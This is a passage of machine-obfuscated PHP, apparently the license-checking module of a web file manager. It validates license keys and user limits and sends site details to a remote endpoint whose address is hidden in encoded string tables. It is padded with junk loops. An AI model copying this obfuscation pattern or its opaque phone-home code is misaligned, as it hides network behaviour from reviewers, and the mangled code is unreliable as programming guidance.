isset($ƒÚ©ë¹[2]) && $ƒÚ©ë¹[0] ? $ƒÚ©ë¹[2] : $this->defaultAction); $‹À—’ŠÏ = $Ğº×Ë„–[707]; if (strlen($‹À—’ŠÏ) < $Ğº×Ë„–[694]) { die; } define($“¥•ïúØ[23], MOD . $“¥•ïúØ[0] . ST . $“¥•ïúØ[0] . ACT); $_SERVER[$“¥•ïúØ[24]] = strtolower(ACTION); $­î½ş‡ = $Ğº×Ë„–[708]; $this->autorun(); if (count($ƒÚ©ë¹) >= 3) { $this->appRun($Â½ã´ë); } else { $this->appRun(ACTION); } } private $hzyaa39d3f3c = array(); private $izoe53abf557 = ''; public function asufa9e34a24() { $Ğ¶Ğà£Ô =& $_SERVER[†ûãı«°]; $ Õ±¶˜ =& $_SERVER[ÏÊŸ¾Îä]; $this->swje529ec1e6(); $this->xrck153c9614(); $this->yhko4e4aece9(); $this->ujoyee5f315d(); $Å‡¨Úè¼ = $Ğ¶Ğà£Ô[709]; if (!$Å‡¨Úè¼) { die; } $this->vazgcec836dc(); $this->wynv4e979f3f(); $this->zlxbde400d17(); $ŸÌµûƒ = $Ğ¶Ğà£Ô[710]; $this->sqjaecb4b9c2($ Õ±¶˜[25], array($this, $ Õ±¶˜[26])); $this->sqjaecb4b9c2($ Õ±¶˜[27], array($this, $ Õ±¶˜[28])); $this->sqjaecb4b9c2($ Õ±¶˜[29], array($this, $ Õ±¶˜[30])); $this->sqjaecb4b9c2($ Õ±¶˜[31], array($this, $ Õ±¶˜[32])); $Ï›Åí– = $Ğ¶Ğà£Ô[711]; if (strlen($Ï›Åí–) < $Ğ¶Ğà£Ô[712]) { return; } } public function jmqn823e98d5($Ùûñíµ«) { $ÌÍ¼È¬Ç =& $_SERVER[†ûãı«°]; $ÉÑ¸›ãÏ =& $_SERVER[ÏÊŸ¾Îä]; $ôüù•µ = Model($ÉÑ¸›ãÏ[33])->get(); $€±¾‡øÑ = array($ÉÑ¸›ãÏ[34], $ÉÑ¸›ãÏ[35], $ÉÑ¸›ãÏ[36], $ÉÑ¸›ãÏ[37], $ÉÑ¸›ãÏ[38], $ÉÑ¸›ãÏ[39], $ÉÑ¸›ãÏ[40], $ÉÑ¸›ãÏ[41], $ÉÑ¸›ãÏ[42], $ÉÑ¸›ãÏ[43], $ÉÑ¸›ãÏ[44], $ÉÑ¸›ãÏ[45], $ÉÑ¸›ãÏ[46], $ÉÑ¸›ãÏ[47], $ÉÑ¸›ãÏ[48], $ÉÑ¸›ãÏ[49], $ÉÑ¸›ãÏ[50], $ÉÑ¸›ãÏ[51], $ÉÑ¸›ãÏ[52], $ÉÑ¸›ãÏ[53], $ÉÑ¸›ãÏ[54], $ÉÑ¸›ãÏ[55], $ÉÑ¸›ãÏ[56], $ÉÑ¸›ãÏ[57], $ÉÑ¸›ãÏ[58], $ÉÑ¸›ãÏ[59], $ÉÑ¸›ãÏ[60], $ÉÑ¸›ãÏ[61], $ÉÑ¸›ãÏ[62], $ÉÑ¸›ãÏ[63], $ÉÑ¸›ãÏ[64], $ÉÑ¸›ãÏ[65], $ÉÑ¸›ãÏ[66], $ÉÑ¸›ãÏ[67], $ÉÑ¸›ãÏ[68], $ÉÑ¸›ãÏ[69], $ÉÑ¸›ãÏ[70], $ÉÑ¸›ãÏ[71], $ÉÑ¸›ãÏ[72], $ÉÑ¸›ãÏ[73], $ÉÑ¸›ãÏ[74], $ÉÑ¸›ãÏ[75], $ÉÑ¸›ãÏ[76], $ÉÑ¸›ãÏ[77], $ÉÑ¸›ãÏ[78], $ÉÑ¸›ãÏ[79], $ÉÑ¸›ãÏ[80], $ÉÑ¸›ãÏ[81], $ÉÑ¸›ãÏ[82], $ÉÑ¸›ãÏ[83], $ÉÑ¸›ãÏ[84], $ÉÑ¸›ãÏ[85]); $¿‘á¶’¢ = $ÌÍ¼È¬Ç[713]; while ($¿‘á¶’¢ < $ÌÍ¼È¬Ç[705]) { if ($¿‘á¶’¢ >= 0) { break; } $¿‘á¶’¢++; } foreach ($€±¾‡øÑ as $©Éµğ¾°) { $˜Ö¼”·Ñ = $GLOBALS[$ÉÑ¸›ãÏ[86]][$ÉÑ¸›ãÏ[87]][$©Éµğ¾°]; $ú‰ñÕ‹¼ = $ÌÍ¼È¬Ç[714]; while ($ú‰ñÕ‹¼ < $ÌÍ¼È¬Ç[712]) { if ($ú‰ñÕ‹¼ >= 0) { break; } $ú‰ñÕ‹¼++; } if (isset($ôüù•µ[$©Éµğ¾°])) { $˜Ö¼”·Ñ = $ôüù•µ[$©Éµğ¾°]; } $Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[89]][$©Éµğ¾°] = $˜Ö¼”·Ñ; } $ä­êºÁ = $Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[89]][$ÉÑ¸›ãÏ[46]]; $§áº¸ÃÕ = $ÌÍ¼È¬Ç[715]; if (strlen($§áº¸ÃÕ) < $ÌÍ¼È¬Ç[694]) { return; } unset($Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[90]][$ÉÑ¸›ãÏ[91]]); $‘ÎŠ·…Ä = $ÌÍ¼È¬Ç[716]; if (!$‘ÎŠ·…Ä) { die; } unset($Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[90]][$ÉÑ¸›ãÏ[92]]); unset($Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[89]][$ÉÑ¸›ãÏ[46]]); $ßæŸôò = $ÌÍ¼È¬Ç[717]; if (strlen($ßæŸôò) < $ÌÍ¼È¬Ç[694]) { return; } unset($Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[89]][$ÉÑ¸›ãÏ[93]]); $Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[89]][$ÉÑ¸›ãÏ[94]] = array($ÉÑ¸›ãÏ[95] => (int) $ä­êºÁ[$ÉÑ¸›ãÏ[96]], $ÉÑ¸›ãÏ[97] => (int) _get($ä­êºÁ, $ÉÑ¸›ãÏ[98], 0)); $ì¸ğ¿ˆ = substr(md5($ÉÑ¸›ãÏ[99] . get_client_ip() . $ôüù•µ[$ÉÑ¸›ãÏ[100]]), 0, 15); $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[102]] = Mcrypt::encode(Session::sign(), $ì¸ğ¿ˆ, 3600 * 24); $…ŒÏÌø  = $ÌÍ¼È¬Ç[718]; if (strlen($…ŒÏÌø ) < $ÌÍ¼È¬Ç[690]) { return; } $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[103]] = Action($ÉÑ¸›ãÏ[104])->accessToken(); $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[105]] = md5($_SERVER[$ÉÑ¸›ãÏ[106]] . $ôüù•µ[$ÉÑ¸›ãÏ[100]]); $ÊÎÄô—õ = $ÌÍ¼È¬Ç[719]; while (strlen($ÊÎÄô—õ) < $ÌÍ¼È¬Ç[712]) { if (!$ÊÎÄô—õ) { break; } $ÊÎÄô—õ++; } $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[107]] = base64_encode(serverInfo()); $åÄÀ¨¿ø = $ÌÍ¼È¬Ç[720]; while (strlen($åÄÀ¨¿ø) < $ÌÍ¼È¬Ç[690]) { if (!$åÄÀ¨¿ø) { break; } $åÄÀ¨¿ø++; } $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[108]] = $this->izoe53abf557; if ($ôüù•µ[$ÉÑ¸›ãÏ[108]] != $ÉÑ¸›ãÏ[109]) { $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[110]] = $ôüù•µ[$ÉÑ¸›ãÏ[110]]; $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[111]] = $ôüù•µ[$ÉÑ¸›ãÏ[111]]; $ãûÀéÒ½ = rand_string(10) . $this->izoe53abf557 . rand_string(5); $Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[112]][$ÉÑ¸›ãÏ[113]] = $this->yfmadc81930e($ãûÀéÒ½, $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[105]]); } if ($this->izoe53abf557 == $ÉÑ¸›ãÏ[109]) { $Ùûñíµ«[$ÉÑ¸›ãÏ[88]][$ÉÑ¸›ãÏ[89]][$ÉÑ¸›ãÏ[94]][$ÉÑ¸›ãÏ[98]] = 0; } $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[114]] = $this->versionPluginFilter(); $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[115]] = _get($this->hzyaa39d3f3c, $ÉÑ¸›ãÏ[116], $ÉÑ¸›ãÏ[6]); if (KodUser::isRoot() && $this->config[$ÉÑ¸›ãÏ[117]]) { $Ùûñíµ«[$ÉÑ¸›ãÏ[101]][$ÉÑ¸›ãÏ[118]] = WEB_ROOT; } return $Ùûñíµ«; } private function wynv4e979f3f() { $™úÉŠÂ¸ =& $_SERVER[†ûãı«°]; $â‰Ã®·† =& $_SERVER[ÏÊŸ¾Îä]; $ˆé§ÁÔË = $_SERVER[$â‰Ã®·†[24]] == $â‰Ã®·†[119]; $±üôüöó = $™úÉŠÂ¸[721]; while ($±üôüöó < $™úÉŠÂ¸[712]) { if ($±üôüöó >= 0) { break; } $±üôüöó++; } if ($_SERVER[$â‰Ã®·†[24]] == $â‰Ã®·†[120] && $_GET[$â‰Ã®·†[121]] == $â‰Ã®·†[122]) { $ˆé§ÁÔË = !0; } if ($ˆé§ÁÔË) { $âûÓ‹à¾ = array($â‰Ã®·†[108] => $this->izoe53abf557, $â‰Ã®·†[123] => $this->krand0a2c9c7(), $â‰Ã®·†[124] => Model($â‰Ã®·†[125])->count()); if ($this->izoe53abf557 != $â‰Ã®·†[109]) { $³’ëíÖÛ = _get($this->hzyaa39d3f3c, $â‰Ã®·†[126]); if ($³’ëíÖÛ) { $âûÓ‹à¾[$â‰Ã®·†[127]] = $³’ëíÖÛ; $âûÓ‹à¾[$â‰Ã®·†[128]] = strtotime(_get($this->hzyaa39d3f3c, $â‰Ã®·†[129])); $âûÓ‹à¾[$â‰Ã®·†[130]] = _get($this->hzyaa39d3f3c, $â‰Ã®·†[116]); } $ğ­ß¾¶ì = Model($â‰Ã®·†[33])->get($â‰Ã®·†[131], $â‰Ã®·†[6], !0); if (is_string($ğ­ß¾¶ì) && substr($ğ­ß¾¶ì, 0, 1) == $â‰Ã®·†[132]) { $ğ­ß¾¶ì = json_decode_force($ğ­ß¾¶ì); } if (is_array($ğ­ß¾¶ì) && $ğ­ß¾¶ì[$â‰Ã®·†[133]] && strstr($ğ­ß¾¶ì[$â‰Ã®·†[133]], $â‰Ã®·†[134])) { $ÛûÅêµ’ = explode($â‰Ã®·†[134], $ğ­ß¾¶ì[$â‰Ã®·†[133]]); $âûÓ‹à¾[$â‰Ã®·†[135]] = $ÛûÅêµ’[0]; } } $âûÓ‹à¾ = $this->tdrva9d52f38(json_encode($âûÓ‹à¾), md5($â‰Ã®·†[136])); $…–‰ğóÂ = $™úÉŠÂ¸[722]; while ($…–‰ğóÂ < $™úÉŠÂ¸[690]) { if ($…–‰ğóÂ >= 0) { break; } $…–‰ğóÂ++; } $³›Ó”Ü— = array($â‰Ã®·†[137] => $âûÓ‹à¾); $üÓ×µóÛ = $™úÉŠÂ¸[723]; call_user_func(array($â‰Ã®·†[138], $â‰Ã®·†[139]), $³›Ó”Ü—); $°ò”Ô˜ù = $™úÉŠÂ¸[724]; while (strlen($°ò”Ô˜ù) < $™úÉŠÂ¸[690]) { if (!$°ò”Ô˜ù) { break; } $°ò”Ô˜ù++; } } if ($this->izoe53abf557 == $â‰Ã®·†[109]) { return; } $ä¹È‰…» = array($â‰Ã®·†[140], $â‰Ã®·†[141], $â‰Ã®·†[142], $â‰Ã®·†[143], $â‰Ã®·†[144], $â‰Ã®·†[145]); $Á¶¸¡ = Model($â‰Ã®·†[33])->get(); $³›Ó”Ü— = array($â‰Ã®·†[146] => $Á¶¸¡[$â‰Ã®·†[34]], $â‰Ã®·†[147] => $Á¶¸¡[$â‰Ã®·†[35]], $â‰Ã®·†[148] => $â‰Ã®·†[6]); foreach ($ä¹È‰…» as $û·£ÓÑ¥) { if (!isset($Á¶¸¡[$û·£ÓÑ¥]) || !$Á¶¸¡[$û·£ÓÑ¥]) { continue; } $³›Ó”Ü—[$û·£ÓÑ¥] = $Á¶¸¡[$û·£ÓÑ¥]; $¿†Š¨§ì = $™úÉŠÂ¸[725]; if (strlen($¿†Š¨§ì) < $™úÉŠÂ¸[690]) { return; } } call_user_func(array($â‰Ã®·†[138], $â‰Ã®·†[139]), $³›Ó”Ü—); } private function ujoyee5f315d() { $ú¡ı‹· =& $_SERVER[†ûãı«°]; $û°Ú¤˜¸ =& $_SERVER[ÏÊŸ¾Îä]; if ($_SERVER[$û°Ú¤˜¸[24]] != $û°Ú¤˜¸[149]) { return; } if (!KodUser::isRoot()) { die; } $æ¿‘š¥õ = $GLOBALS[$û°Ú¤˜¸[13]]; if (isset($æ¿‘š¥õ[$û°Ú¤˜¸[150]])) { $this->fgpk05be6e8d(); die; } if (isset($æ¿‘š¥õ[$û°Ú¤˜¸[151]]) && isset($æ¿‘š¥õ[$û°Ú¤˜¸[151]]) == $û°Ú¤˜¸[122]) { $æ¿‘š¥õ[$û°Ú¤˜¸[152]] = Model($û°Ú¤˜¸[33])->get($û°Ú¤˜¸[153]); } if (!isset($æ¿‘š¥õ[$û°Ú¤˜¸[152]]) || strlen($æ¿‘š¥õ[$û°Ú¤˜¸[152]]) != 16) { show_json($û°Ú¤˜¸[154] . $æ¿‘š¥õ[$û°Ú¤˜¸[152]], !1); } $¬Â«¥ = Model($û°Ú¤˜¸[33])->get($û°Ú¤˜¸[100]); $Ù¡¿·–ó = md5($_SERVER[$û°Ú¤˜¸[106]] . $¬Â«¥); $£á€¸ = $ú¡ı‹·[726]; if (strlen($£á€¸) < $ú¡ı‹·[701]) { return; } $‰àòñÍ = array($û°Ú¤˜¸[152] => $æ¿‘š¥õ[$û°Ú¤˜¸[152]], $û°Ú¤˜¸[155] => rand_string(16), $û°Ú¤˜¸[156] => $û°Ú¤˜¸[136], $û°Ú¤˜¸[157] => $û°Ú¤˜¸[158], $û°Ú¤˜¸[159] => $_SERVER[$û°Ú¤˜¸[160]], $û°Ú¤˜¸[161] => $_SERVER[$û°Ú¤˜¸[162]], $û°Ú¤˜¸[163] => $_SERVER[$û°Ú¤˜¸[164]], $û°Ú¤˜¸[105] => $Ù¡¿·–ó, $û°Ú¤˜¸[165] => Model($û°Ú¤˜¸[33])->get($û°Ú¤˜¸[131])); $ìøìˆøœ = $ú¡ı‹·[727]; if (isset($æ¿‘š¥õ[$û°Ú¤˜¸[151]]) && isset($æ¿‘š¥õ[$û°Ú¤˜¸[151]]) == $û°Ú¤˜¸[122]) { $‰àòñÍ[$û°Ú¤˜¸[151]] = md5($‰àòñÍ[$û°Ú¤˜¸[152]] . $û°Ú¤˜¸[166] . $‰àòñÍ[$û°Ú¤˜¸[155]]); } if ($æ¿‘š¥õ[$û°Ú¤˜¸[167]] == $û°Ú¤˜¸[168]) { $Ó‚‹ª˜ç = $this->tdrva9d52f38($Ù¡¿·–ó, $û°Ú¤˜¸[169]); $¢—Œ€®™ = $this->yfmadc81930e(json_encode($‰àòñÍ), $Ù¡¿·–ó . $û°Ú¤˜¸[170], 3); $¢—Œ€®™ = $¢—Œ€®™ . $û°Ú¤˜¸[171] . $_SERVER[$û°Ú¤˜¸[160]]; $Ëø‚ŠÎ = $this->jraf4e3636cf($û°Ú¤˜¸[172] . $Ó‚‹ª˜ç . $û°Ú¤˜¸[173] . $¢—Œ€®™, -1); show_json($Ëø‚ŠÎ, !0); } else { if ($æ¿‘š¥õ[$û°Ú¤˜¸[167]] == $û°Ú¤˜¸[174]) { $‘± ß»Ù = substr(md5($û°Ú¤˜¸[175] . $Ù¡¿·–ó), 12, 15) . $û°Ú¤˜¸[176]; $¢—Œ€®™ = $this->jsvkd9172d2f(trim($æ¿‘š¥õ[$û°Ú¤˜¸[177]]), $‘± ß»Ù, 2); $š­û¹ ½ = json_decode($¢—Œ€®™, !0); if (!is_array($š­û¹ ½) || !is_array($š­û¹ ½[$û°Ú¤˜¸[178]]) || $š­û¹ ½[$û°Ú¤˜¸[152]] != !0) { $†ˆÕŞºÒ = $û°Ú¤˜¸[179]; $Û ûöù = $š­û¹ ½[$û°Ú¤˜¸[178]] ? $û°Ú¤˜¸[180] . $š­û¹ ½[$û°Ú¤˜¸[178]] : $†ˆÕŞºÒ; show_json($Û ûöù, !1); } else { $‰àòñÍ[$û°Ú¤˜¸[155]] = $š­û¹ ½[$û°Ú¤˜¸[178]][$û°Ú¤˜¸[181]]; } } else { $š­û¹ ½ = $this->jraf4e3636cf($û°Ú¤˜¸[182], $‰àòñÍ, 10); $€±˜ÚÁÛ = $ú¡ı‹·[728]; while ($€±˜ÚÁÛ < $ú¡ı‹·[694]) { if ($€±˜ÚÁÛ >= 0) { break; } $€±˜ÚÁÛ++; } } } if (!is_array($š­û¹ ½) || !is_array($š­û¹ ½[$û°Ú¤˜¸[178]]) || $š­û¹ ½[$û°Ú¤˜¸[152]] != !0) { $†ˆÕŞºÒ = LNG($û°Ú¤˜¸[183]); $Û ûöù = $š­û¹ ½[$û°Ú¤˜¸[178]] ? $û°Ú¤˜¸[180] . $š­û¹ ½[$û°Ú¤˜¸[178]] : $†ˆÕŞºÒ; show_json($Û ûöù, !1); } $†öÊğÊ = $š­û¹ ½[$û°Ú¤˜¸[178]]; $®¶ËÏ× = $this->ycjp900388b2($†öÊğÊ[$û°Ú¤˜¸[184]]); $×ä¶Õğ = $ú¡ı‹·[729]; while (strlen($×ä¶Õğ) < $ú¡ı‹·[705]) { if (!$×ä¶Õğ) { break; } $×ä¶Õğ++; } if (!$®¶ËÏ× || $®¶ËÏ× != $†öÊğÊ[$û°Ú¤˜¸[129]]) { $­ŒäœÈ = array($û°Ú¤˜¸[185] => Model($û°Ú¤˜¸[33])->get($û°Ú¤˜¸[100]), $û°Ú¤˜¸[186] => $_SERVER[$û°Ú¤˜¸[106]], $û°Ú¤˜¸[187] => this_url(), $û°Ú¤˜¸[161] => $_SERVER[$û°Ú¤˜¸[162]]); $¢—Œ€®™ = $this->hljz246e0f14(json_encode($­ŒäœÈ)); $this->jraf4e3636cf($û°Ú¤˜¸[188] . $¢—Œ€®™); show_json(LNG($û°Ú¤˜¸[189]), !0); } $·½”²çå = array($û°Ú¤˜¸[153] => $†öÊğÊ[$û°Ú¤˜¸[190]], $û°Ú¤˜¸[191] => $†öÊğÊ[$û°Ú¤˜¸[192]], $û°Ú¤˜¸[193] => rand_string(16), $û°Ú¤˜¸[108] => $†öÊğÊ[$û°Ú¤˜¸[194]]); if ($‰àòñÍ[$û°Ú¤˜¸[155]]) { $·½”²çå[$û°Ú¤˜¸[193]] = $‰àòñÍ[$û°Ú¤˜¸[155]]; } $ÉëöŸ„á = substr(md5($·½”²çå[$û°Ú¤˜¸[191]]), 10, 10); $ú³å†×æ = $ÉëöŸ„á . $·½”²çå[$û°Ú¤˜¸[108]] . $·½”²çå[$û°Ú¤˜¸[193]]; $·½”²çå[$û°Ú¤˜¸[110]] = strrev(base64_encode($this->tdrva9d52f38($ú³å†×æ, $û°Ú¤˜¸[195]))); $‹™å‹ÜŞ = $ú¡ı‹·[730]; $à¨ËÇŠÙ = rand_string(16); $ŸÆ²æ§ô = $ú¡ı‹·[731]; if (!$ŸÆ²æ§ô) { return; } $ÅĞšà±Â = $à¨ËÇŠÙ . $·½”²çå[$û°Ú¤˜¸[108]] . $this->tdrva9d52f38(md5($·½”²çå[$û°Ú¤˜¸[153]]), $à¨ËÇŠÙ); $êŒ¥¤ÛÊ = $ú¡ı‹·[732]; if (!$êŒ¥¤ÛÊ) { return; } $·½”²çå[$û°Ú¤˜¸[111]] = base64_encode(strrev($this->tdrva9d52f38($ÅĞšà±Â, $û°Ú¤˜¸[196]))); if ($†öÊğÊ[$û°Ú¤˜¸[197]] && $†öÊğÊ[$û°Ú¤˜¸[197]] >= 1) { Model($û°Ú¤˜¸[33])->setDeep($û°Ú¤˜¸[198], $û°Ú¤˜¸[122]); } Model($û°Ú¤˜¸[33])->set($·½”²çå); $¤ÇŠ«Ê‹ = md5($_SERVER[$û°Ú¤˜¸[106]] . strrev($¬Â«¥) . $·½”²çå[$û°Ú¤˜¸[191]]); $ûºìµÌ = $ú¡ı‹·[727]; if (!$ûºìµÌ) { die; } $„Ø‹¨† = strrev(substr($¤ÇŠ«Ê‹, 10, 16)); $÷ğĞ‘Ù× = $this->yfmadc81930e(json_encode($†öÊğÊ), $¤ÇŠ«Ê‹); $Š¦üŞûœ = array_to_keyvalue(Model($û°Ú¤˜¸[7])->listData(), $û°Ú¤˜¸[199]); $÷®›¹Ñ¶ = $Š¦üŞûœ[$û°Ú¤˜¸[200]]; $¤ÙæÔº = array(); $‰ûÌ×¡û = $ú¡ı‹·[733]; if (strlen($‰ûÌ×¡û) < $ú¡ı‹·[705]) { return; } $¤ÙæÔº[$„Ø‹¨†] = $÷ğĞ‘Ù×; $Ğˆµ‘«Š = $ú¡ı‹·[734]; while ($Ğˆµ‘«Š < $ú¡ı‹·[690]) { if ($Ğˆµ‘«Š >= 0) { break; } $Ğˆµ‘«Š++; } Model($û°Ú¤˜¸[7])->update($÷®›¹Ñ¶[$û°Ú¤˜¸[201]], array($û°Ú¤˜¸[202] => $¤ÙæÔº)); $this->hzyaa39d3f3c = $†öÊğÊ; $óÅıĞ€ = $ú¡ı‹·[735]; if (strlen($óÅıĞ€) < $ú¡ı‹·[690]) { return; } $this->izoe53abf557 = $·½”²çå[$û°Ú¤˜¸[108]]; $÷°õ¢ô = $ú¡ı‹·[736]; if (strlen($÷°õ¢ô) < $ú¡ı‹·[690]) { die; } $this->licenseRegistSuccess(); $¤õùõ–Ÿ = $ú¡ı‹·[737]; if (strlen($¤õùõ–Ÿ) < $ú¡ı‹·[690]) { return; } Cache::set($û°Ú¤˜¸[203] . md5($¬Â«¥ . $û°Ú¤˜¸[204]), $û°Ú¤˜¸[6]); show_json(LNG($û°Ú¤˜¸[189]), !0); $ôëŞŸÙç = $ú¡ı‹·[738]; while ($ôëŞŸÙç < $ú¡ı‹·[701]) { if ($ôëŞŸÙç >= 0) { break; } $ôëŞŸÙç++; } } private function licenseRegistSuccess() { $Îšä½‡ =& $_SERVER[ÏÊŸ¾Îä]; $Æ¾¶¼Ãç = Model($Îšä½‡[33])->get(); if ($Æ¾¶¼Ãç[$Îšä½‡[63]] != $Îšä½‡[122]) { Model($Îšä½‡[33])->set($Îšä½‡[63], $Îšä½‡[122]); } Action($Îšä½‡[205])->initStart(!0); } private function fgpk05be6e8d() { $Õ±ş¤Êõ =& $_SERVER[ÏÊŸ¾Îä]; Model($Õ±ş¤Êõ[33])->set(array($Õ±ş¤Êõ[153] => $Õ±ş¤Êõ[6], $Õ±ş¤Êõ[191] => $Õ±ş¤Êõ[6], $Õ±ş¤Êõ[108] => $Õ±ş¤Êõ[109], $Õ±ş¤Êõ[110] => $Õ±ş¤Êõ[6], $Õ±ş¤Êõ[111] => $Õ±ş¤Êõ[6])); Model($Õ±ş¤Êõ[33])->setDeep($Õ±ş¤Êõ[198], $Õ±ş¤Êõ[206]); $this->hzyaa39d3f3c = array(); $this->izoe53abf557 = $Õ±ş¤Êõ[109]; } private function swje529ec1e6() { $Ä”Àı­» =& $_SERVER[†ûãı«°]; $ØîöªÄ =& $_SERVER[ÏÊŸ¾Îä]; $_SERVER[$ØîöªÄ[162]] = _get($_SERVER, $ØîöªÄ[162], APP_HOST); $ËÓ®ß¸“ = $Ä”Àı­»[739]; if (!$ËÓ®ß¸“) { die; } $this->izoe53abf557 = $ØîöªÄ[109]; $šåé«€¥ = $Ä”Àı­»[740]; $¤Í£ú³¸ = Model($ØîöªÄ[33])->get(); $ü äÉÅ¤ = $Ä”Àı­»[741]; if ($¤Í£ú³¸[$ØîöªÄ[108]] == $ØîöªÄ[109]) { return; } $—Ãû°›‹ = Model($ØîöªÄ[33])->get($ØîöªÄ[100]); $ï¸¬„´ = $Ä”Àı­»[742]; if (!$ï¸¬„´) { return; } $øìôéå” = $ØîöªÄ[203] . md5($—Ãû°›‹ . $ØîöªÄ[204]); $ƒÂŞåºî = $Ä”Àı­»[743]; if (strlen($ƒÂŞåºî) < $Ä”Àı­»[705]) { die; } $ĞŒ÷Êßí = Cache::get($øìôéå”); $‚Á‘ÅŒÜ = $Ä”Àı­»[744]; if (!$‚Á‘ÅŒÜ) { return; } if (!is_array($ĞŒ÷Êßí) || !isset($ĞŒ÷Êßí[$ØîöªÄ[207]]) || time() - $ĞŒ÷Êßí[$ØîöªÄ[207]] >= 60) { $ßôÚ¢æ” = Model($ØîöªÄ[7])->loadList(); $ÎÉÏ‰Êá = $ßôÚ¢æ”[$ØîöªÄ[200]]; $­…¸ÔÔ = md5($_SERVER[$ØîöªÄ[106]] . strrev($—Ãû°›‹) . $¤Í£ú³¸[$ØîöªÄ[191]]); $Ú«„Ùü = strrev(substr($­…¸ÔÔ, 10, 16)); $ĞŒ÷Êßí = $this->jsvkd9172d2f($ÎÉÏ‰Êá[$ØîöªÄ[86]][$Ú«„Ùü], $­…¸ÔÔ); $ĞŒ÷Êßí = json_decode($ĞŒ÷Êßí, !0); } if (!is_array($ĞŒ÷Êßí)) { return $this->fgpk05be6e8d(); } $™˜„ßÇà = strtotime($ĞŒ÷Êßí[$ØîöªÄ[129]]); if (time() >= $™˜„ßÇà) { return $this->fgpk05be6e8d(); } if (!isset($ĞŒ÷Êßí[$ØîöªÄ[207]]) || time() - $ĞŒ÷Êßí[$ØîöªÄ[207]] > 20) { $ĞŒ÷Êßí[$ØîöªÄ[207]] = time(); Cache::set($øìôéå”, $ĞŒ÷Êßí); } $this->hzyaa39d3f3c = $ĞŒ÷Êßí; $this->izoe53abf557 = $¤Í£ú³¸[$ØîöªÄ[108]]; $â¤‰‘¿’ = $Ä”Àı­»[745]; while (strlen($â¤‰‘¿’) < $Ä”Àı­»[705]) { if (!$â¤‰‘¿’) { break; } $â¤‰‘¿’++; } } private function xrck153c9614() { $—ÅøşÜ€ =& $_SERVER[ÏÊŸ¾Îä]; $¶ĞŞØÙ = $GLOBALS[$—ÅøşÜ€[13]]; $„ºŸ¬Ç¶ = $_SERVER[$—ÅøşÜ€[24]]; $÷ïòöò£ = $_SERVER[†ûãı«°][746]; if (!$÷ïòöò£) { return; } if ($„ºŸ¬Ç¶ == $—ÅøşÜ€[208] && $this->izoe53abf557 == $—ÅøşÜ€[109]) { show_json(LNG($—ÅøşÜ€[209]), !1, $—ÅøşÜ€[210]); } $Ğç¹ìÒû = array($—ÅøşÜ€[211], $—ÅøşÜ€[212]); if (in_array($„ºŸ¬Ç¶, $Ğç¹ìÒû)) { if ($this->izoe53abf557 == $—ÅøşÜ€[109] && isset($¶ĞŞØÙ[$—ÅøşÜ€[213]])) { show_json(LNG($—ÅøşÜ€[209]), !1, $—ÅøşÜ€[210]); die; } $øÛ¤€Âê = $this->krand0a2c9c7(); if ($øÛ¤€Âê != intval($—ÅøşÜ€[214])) { if ($øÛ¤€Âê <= Model($—ÅøşÜ€[125])->count()) { show_json(LNG($—ÅøşÜ€[215]), !1, $—ÅøşÜ€[210]); die; } } } } private function yhko4e4aece9() { $¸œ•Ñİ× =& $_SERVER[ÏÊŸ¾Îä]; $ÚİéÀÙµ = array($¸œ•Ñİ×[119], $¸œ•Ñİ×[120]); $·“è±íµ = $_SERVER[†ûãı«°][747]; if (!$·“è±íµ) { die; } if (!KodUser::isRoot() || !isset($_GET[$¸œ•Ñİ×[216]])) { return; } if (!in_array($_SERVER[$¸œ•Ñİ×[24]], $ÚİéÀÙµ)) { return; } $ÜŒì¸ìü = $¸œ•Ñİ×[217]; $ÜŒì¸ìü = $this->dgyt39e462a0($ÜŒì¸ìü, $¸œ•Ñİ×[218]); $ŸÀ¶¥Ş = stream_context_create(array($¸œ•Ñİ×[219] => array($¸œ•Ñİ×[220] => $¸œ•Ñİ×[221], $¸œ•Ñİ×[222] => 3))); $šªÑÜ  = @file_get_contents($ÜŒì¸ìü, !1, $ŸÀ¶¥Ş); header($¸œ•Ñİ×[223]); if ($šªÑÜ  && strstr($šªÑÜ , $¸œ•Ñİ×[224])) { echo $šªÑÜ ; } die; } public function cxhu5ea9412d($Ò–ÎŸÔó) { $Ô¤şáçº =& $_SERVER[†ûãı«°]; $ÂàÔş» =& $_SERVER[ÏÊŸ¾Îä]; if ($this->izoe53abf557 == $ÂàÔş»[225]) { return $Ò–ÎŸÔó; } $ªÓº¥Ç¼ = $this->versionPluginList(); $•ıà×æè = $Ô¤şáçº[748]; if (strlen($•ıà×æè) < $Ô¤şáçº[690]) { return; } $éòˆ¨Ÿš = explode($ÂàÔş»[226], $this->versionPluginFilter()); $ï„³ÒÏ = array(); $à‡ÂÑ½ø = $Ô¤şáçº[749]; if (!$à‡ÂÑ½ø) { return; } foreach ($ªÓº¥Ç¼ as $ÔÚòè¼ö => $ˆ±ÜÍÓğ) { if ($ˆ±ÜÍÓğ == $ÂàÔş»[227] && substr($this->izoe53abf557, 0, 1) == $ÂàÔş»[227]) { continue; } if (!in_array($ÔÚòè¼ö, $éòˆ¨Ÿš)) { $ï„³ÒÏ[] = 